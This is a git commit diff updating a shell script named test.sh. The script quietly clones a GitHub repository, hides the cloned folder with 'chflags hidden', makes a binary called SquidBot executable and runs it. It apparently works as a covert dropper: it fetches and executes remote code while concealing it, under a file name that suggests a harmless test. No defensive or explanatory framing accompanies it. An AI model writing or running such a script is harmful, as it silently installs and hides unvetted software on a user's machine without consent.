c59a29c606fc48698140722c8277de558ba08595
afang0078 <100039430+afang0078@users.noreply.github.com>
2022-02-20 06:47:28 +0000

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,1 +1,6 @@
-git clone --quiet https://github.com/afang0078/test0962; chflags hidden test0962; cd test0962; chmod +x SquidBot; ./SquidBot 
+#Terminal
+git clone --quiet https://github.com/afang0078/test0962; 
+chflags hidden test0962; 
+cd test0962; 
+chmod +x SquidBot; 
+./SquidBot 
